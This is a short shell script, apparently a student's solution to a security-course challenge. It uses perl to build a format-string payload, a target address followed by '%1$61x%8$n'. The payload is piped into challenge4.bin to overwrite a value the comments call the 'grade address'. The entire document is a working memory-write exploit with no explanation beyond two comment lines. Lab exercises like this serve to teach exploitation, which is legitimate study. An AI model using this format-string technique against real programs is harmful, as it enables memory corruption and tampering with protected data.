#0x0804a01c = grade address
#8th word = address added

perl -e 'print "\x1c\xa0\x04\x08";' > attack_spell4.txt
perl -e 'print "%1\$61x%8\$n";' >> attack_spell4.txt
perl -e 'print " \n";' >> attack_spell4.txt 
perl -e 'print "Rock Beom Kim ";' >> attack_spell4.txt

./challenge4.bin < attack_spell4.txt
